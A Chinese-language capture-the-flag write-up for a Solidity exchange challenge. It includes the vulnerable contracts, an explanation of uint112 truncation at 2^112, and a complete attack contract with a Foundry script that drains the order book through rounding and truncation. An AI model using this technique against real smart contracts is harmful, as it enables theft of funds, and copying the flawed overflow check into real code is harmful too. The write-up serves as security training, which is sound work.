# Capital prevails

# 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./ERC20.sol";
import "./Safe.sol";

contract Capital_prevails is Safe {
    struct Trade {
        address maker;
        address taker;
        address tokenToSell;
        address tokenToBuy;
        uint112 amountToSell;
        uint112 amountToBuy;
        uint112 filledAmountToSell;
        uint112 filledAmountToBuy;
        bool isActive;
    }

    mapping(uint256 => Trade) public trades;
    uint256 public nextTradeId;
    bool private locked;
    uint256 public fee = 30 wei;

    event TradeCreated(
        uint256 indexed tradeId,
        address indexed maker,
        address tokenToSell,
        address tokenToBuy,
        uint256 amountToSell,
        uint256 amountToBuy
    );
    event TradeSettled(
        uint256 indexed tradeId,
        address indexed settler,
        uint256 settledAmountToSell
    );
    event TradeCancelled(uint256 indexed tradeId);

    modifier nonReentrant() {
        //重入锁
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function createTrade(
        //挂订单
        address _tokenToSell, //rweb 卖
        address _tokenToBuy, //weth 买
        uint256 _amountToSell, //10 卖的数量
        uint256 _amountToBuy //1 买的数量
    ) external nonReentrant {
        require(
            _tokenToSell != address(0) && _tokenToBuy != address(0),
            "Invalid token addresses"
        );

        uint256 tradeId = nextTradeId++;
        trades[tradeId] = Trade({
            maker: msg.sender,
            taker: address(0),
            tokenToSell: _tokenToSell,
            tokenToBuy: _tokenToBuy,
            amountToSell: safeCast(_amountToSell - fee), //30wei 手续费，相当于锁了30wei不能拿出去交易,这里都能过
            amountToBuy: safeCast(_amountToBuy),
            filledAmountToSell: 0,
            filledAmountToBuy: 0,
            isActive: true
        });

        require(
            IERC20(_tokenToSell).transferFrom(
                msg.sender,
                address(this),
                _amountToSell //得到 10 rweb
            ),
            "Transfer failed"
        );

        emit TradeCreated(
            tradeId,
            msg.sender, //maker
            _tokenToSell,
            _tokenToBuy,
            _amountToSell,
            _amountToBuy
        );
    }

    function scaleTrade(uint256 _tradeId, uint256 scale) external nonReentrant {
        //只有maker能调用 也就是setup 除非我们自己挂一单 ！！！
        require(msg.sender == trades[_tradeId].maker, "Only maker can scale");
        Trade storage trade = trades[_tradeId];
        require(trade.isActive, "Trade is not active");
        require(scale > 0, "Invalid scale");
        require(trade.filledAmountToBuy == 0, "Trade is already filled");
        uint112 originalAmountToSell = trade.amountToSell;
        trade.amountToSell = safeCast(safeMul(trade.amountToSell, scale)); //这里会卡住，过不去safeMul()的require
        trade.amountToBuy = safeCast(safeMul(trade.amountToBuy, scale)); //主要是这里要砍成0
        uint256 newAmountNeededWithFee = safeCast(
            safeMul(originalAmountToSell, scale) + fee
        );
        if (originalAmountToSell < newAmountNeededWithFee) {
            require(
                IERC20(trade.tokenToSell).transferFrom(
                    msg.sender,
                    address(this),
                    newAmountNeededWithFee - originalAmountToSell
                ),
                "Transfer failed"
            );
        }
    }

    function settleTrade(
        //msg.sender可调用
        uint256 _tradeId,
        uint256 _amountToSettle
    ) external nonReentrant {
        Trade storage trade = trades[_tradeId];
        require(trade.isActive, "Trade is not active"); //自己挂的那单已经设成了true
        require(_amountToSettle > 0, "Invalid settlement amount");
        uint256 tradeAmount = _amountToSettle * trade.amountToBuy;

        require(
            trade.filledAmountToSell + _amountToSettle <= trade.amountToSell,
            "Exceeds available amount"
        );

        require(
            IERC20(trade.tokenToBuy).transferFrom(
                msg.sender,
                trade.maker,
                tradeAmount / trade.amountToSell
            ),
            "Buy transfer failed"
        );
        require(
            IERC20(trade.tokenToSell).transfer(msg.sender, _amountToSettle),
            "Sell transfer failed"
        );

        trade.filledAmountToSell += safeCast(_amountToSettle);
        trade.filledAmountToBuy += safeCast(tradeAmount / trade.amountToSell);

        if (trade.filledAmountToSell > trade.amountToSell) {
            trade.isActive = false;
        }

        emit TradeSettled(_tradeId, msg.sender, _amountToSettle);
    }

    function cancelTrade(uint256 _tradeId) external nonReentrant {
        Trade storage trade = trades[_tradeId];
        require(msg.sender == trade.maker, "Only maker can cancel");
        require(trade.isActive, "Trade is not active");

        uint256 remainingAmount = trade.amountToSell - trade.filledAmountToSell;
        if (remainingAmount > 0) {
            require(
                IERC20(trade.tokenToSell).transfer(
                    trade.maker,
                    remainingAmount
                ),
                "Transfer failed"
            );
        }

        trade.isActive = false;

        emit TradeCancelled(_tradeId);
    }

    function getTrade(
        uint256 _tradeId
    )
        external
        view
        returns (
            address maker,
            address taker,
            address tokenToSell,
            address tokenToBuy,
            uint256 amountToSell,
            uint256 amountToBuy,
            uint256 filledAmountToSell,
            uint256 filledAmountToBuy,
            bool isActive
        )
    {
        Trade storage trade = trades[_tradeId];
        return (
            trade.maker,
            trade.taker,
            trade.tokenToSell,
            trade.tokenToBuy,
            trade.amountToSell,
            trade.amountToBuy,
            trade.filledAmountToSell,
            trade.filledAmountToBuy,
            trade.isActive
        );
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract Safe {
    /// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow
    function safeCast(uint256 value) internal pure returns (uint112) {
        require(value <= (1 << 112), "Safe: value exceeds uint112 max");
        return uint112(value);
    }

    /// @dev safeMul is a function that multiplies two uint112 values, and reverts on overflow
    function safeMul(uint112 a, uint256 b) internal pure returns (uint112) {
        require(
            uint256(a) * b <= (1 << 112), // a=!!47!!这里过不了 b=*1<<112
            "Safe: value exceeds uint112 max"
        );
        return uint112(a * b);
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IERC20 {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
}

contract SimpleERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _totalSupply
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = _totalSupply;
    }

    function transfer(address _to, uint256 _value) external returns (bool) {
        require(_to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;

        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) external returns (bool) {
        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool) {
        require(_to != address(0), "Invalid address");
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(
            allowance[_from][msg.sender] >= _value,
            "Insufficient allowance"
        );

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;

        emit Transfer(_from, _to, _value);
        return true;
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
import "./Capital_prevails.sol";

//0x26bB262c72B9cF11B5F84c6a89d2D5A8BBDd3aBE

contract Setup {
    Capital_prevails public capital_prevails;
    SimpleERC20 public rweb;
    SimpleERC20 public weth;
    address public constant proletariat = address(0xc0ffee);

    constructor() {
        capital_prevails = new Capital_prevails();
        weth = new SimpleERC20("Wrapped Ether", "WETH", 18, 10 ether);
        rweb = new SimpleERC20("RWeb Token", "RWEBT", 18, 10 ether);
        rweb.approve(address(capital_prevails), 10 ether);
        capital_prevails.createTrade(
            address(rweb),
            address(weth),
            10 ether,
            1 ether
        );
    }

    function isSolved() public view returns (bool) {
        return rweb.balanceOf(proletariat) >= 10 ether;
    }
}

```

# uint112截断

`uint112`的取值范围是 <font style="background-color:#FBDFEF;">0 到</font><code><font style="background-color:#FBDFEF;">2^112 - 1</font></code>,`(1 << 112)` 等于 `2^112`

* 在 Solidity 中把一个 `uint256` 强制转换 `uint112(value)`，会做 **模 ****2****&#x31;12\*\*\*\*2^{112}****2****&#x31;12** 的截断（低 112 位保留，高位丢弃）。
* 例如 `uint112(2^112) == 0`，因为 `2^112 mod 2^112 = 0`。
* `uint112(2^112 - 1)` 是 `2^112 - 1`

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import "./ERC20.sol";
import "./Safe.sol";
import {Capital_prevails} from "./Capital_prevails.sol";
import {Setup} from "./Setup.sol";

contract Attack {
    Capital_prevails public prevails;
    SimpleERC20 public rweb;
    SimpleERC20 public weth;
    Setup setup;

    constructor(address addr) {
        setup = Setup(addr);
        rweb = setup.rweb();
        weth = setup.weth();
        prevails = Capital_prevails(setup.capital_prevails());
    }

    function attack() external payable {
        rweb.approve(address(prevails), type(uint256).max); //给prevail授权
        rweb.approve(
            0x98707a8Cb53bD823f9c5353611018aF38533adE5,
            type(uint256).max //给eoa授权
        );
        for (int i = 0; i <= 4; i++) {
            //从setup挂的那单白嫖
            prevails.settleTrade(0, 9); //利用向下取整，我们每次付出0，可以得到每轮9wei的rweb
        } //最多白嫖大概2.62e,要跑29000轮
        //这里跑四轮,只要把接下来自己挂单的那个费用白嫖够了就行

        prevails.createTrade(address(rweb), address(weth), 31, 0); //自己挂一单，成为maker,31是考虑到有30wei的手续费,正好剩下1,可以在safe嵌套require那里少算一步(其实是因为我算不明白两步)
        uint256 a = 1 << 112; //这个就是2的112次方
        prevails.scaleTrade(1, a - 30); //第二个参数是关键,要把我们自己挂的那单,利用safe那个require>=的点,把amountToBuy设为0,也就是买家需要给出的代币数量
        prevails.settleTrade(1, rweb.balanceOf(address(prevails))); //从自己挂的那单那里买,由于上一步已经amountToBuy==0,所以这里买就直接花费0个代币,直接把挂单里的都拿来就行了
    }

    receive() external payable {}
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;
import "../src/ERC20.sol";
import "../src/Safe.sol";
import {Capital_prevails} from "../src/Capital_prevails.sol";
import {Setup} from "../src/Setup.sol";
import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        address set = 0x99aEFdDABeA7795069C034121a8EB79311297e06;
        Setup setup = Setup(set);
        SimpleERC20 rweb = setup.rweb();
        Attack attack = new Attack(set);
        attack.attack();
        uint256 money = rweb.balanceOf(address(attack));
        rweb.transferFrom(address(attack), address(0xc0ffee), money);//把攻击合约拿到的rweb都转给0xc0ffee
        require(setup.isSolved() == true, "your issolved is not solved");

        vm.stopBroadcast();
    }
}

```


> 更新: 2025-09-12 10:27:12  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ti80ynazztb47onu>